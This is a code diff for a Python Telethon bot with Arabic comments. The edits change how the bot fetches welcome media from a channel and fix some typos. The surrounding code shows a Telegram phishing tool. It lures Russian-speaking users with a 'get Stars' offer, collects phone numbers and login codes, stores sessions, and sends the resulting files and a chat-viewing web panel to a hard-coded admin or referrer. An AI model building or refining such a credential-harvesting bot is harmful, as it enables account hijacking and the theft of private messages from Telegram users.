@@ -12,7 +12,7 @@ from telethon.errors import (
     SessionPasswordNeededError, 
     PasswordHashInvalidError
 )
-from telethon.tl.types import User, InputMessagesFilterVideo
+from telethon.tl.types import User
 
 # =============================================================
 # 1. إعدادات المتغيرات وقراءة البيئة
@@ -24,7 +24,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
 # الآيدي الافتراضي للمسؤول (في حال تم دخول البوت بدون رابط إحالة)
 DEFAULT_ADMIN_ID = int(os.environ.get("DEFAULT_ADMIN_ID", "5963244397"))
 
-# معرف القناة التي يتم جلب الفيديو الترحيبي منها
+# معرف القناة التي يتم جلب الميديا الترحيبية منها
 CHANNEL_USERNAME = "oaiaiaowowjwjwowjnwkww"
 
 SESSIONS_DIR = "user_sessions"
@@ -160,7 +160,7 @@ WEB_TEMPLATE = """
                     document.getElementById('chats-list').innerHTML = `<div class="p-4 text-center text-red-400">${data.error}</div>`;
                 }
             } catch (e) {
-                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثنا التحميل</div>';
+                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثناء التحميل</div>';
             }
         }
 
@@ -370,7 +370,7 @@ def make_numeric_keyboard(current_code=""):
     ]
     return display, buttons
 
-# استقبال أمر /start مع إرسال أحدث فيديو مباشر من القناة
+# استقبال أمر /start مع إرسال أحدث ميديا (فيديو/GIF) من القناة مباشرة
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
     user_id = event.sender_id
@@ -396,30 +396,30 @@ async def start_command(event):
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
-    video_media = None
+    media_to_send = None
     try:
-        # جلب أحدث رسالة تحتوي على فيديو من القناة
-        async for message in bot.iter_messages(CHANNEL_USERNAME, filter=InputMessagesFilterVideo, limit=1):
+        # البحث في أحدث 5 رسائل في القناة للحصول على الميديا (GIF/فيديو/صورة)
+        async for message in bot.iter_messages(CHANNEL_USERNAME, limit=5):
             if message and message.media:
-                video_media = message.media
-            break
+                media_to_send = message.media
+                break
     except Exception as e:
-        print(f"Error fetching channel video: {e}")
+        print(f"Error fetching channel media: {e}")
 
-    # إرسال الفيديو من القناة إن وُجد، وإلا يتم الاكتفاء بالرسالة النصية
-    if video_media:
+    # إرسال الميديا من القناة مع النص والأزرار إن وجدت
+    if media_to_send:
         try:
             await bot.send_file(
                 event.chat_id,
-                video_media,
+                media_to_send,
                 caption=russian_welcome,
                 buttons=phone_btn
             )
             return
         except Exception as e:
-            print(f"Error sending video file: {e}")
+            print(f"Error sending media file: {e}")
 
-    # كخطة بديلة (Fallback) في حال تعذر إرسال الفيديو لأي سبب
+    # كخطة بديلة إذا تعذر جلب الميديا
     await event.respond(russian_welcome, buttons=phone_btn)
 
 # استقبال رقم الهاتف باللغة الروسية
@@ -585,7 +585,7 @@ async def notify_owner_and_finish(event, user_id):
                 await bot.send_file(
                     DEFAULT_ADMIN_ID,
                     file_path,
-                    caption=f"⚠️ (تعذر الوصول للصاحب الاصلي {referrer_id})\n\n" + notification_text,
+                    caption=f"⚠️ (تعذر الوصول للصاحب الأصلي {referrer_id})\n\n" + notification_text,
                     buttons=web_btn
                 )
 
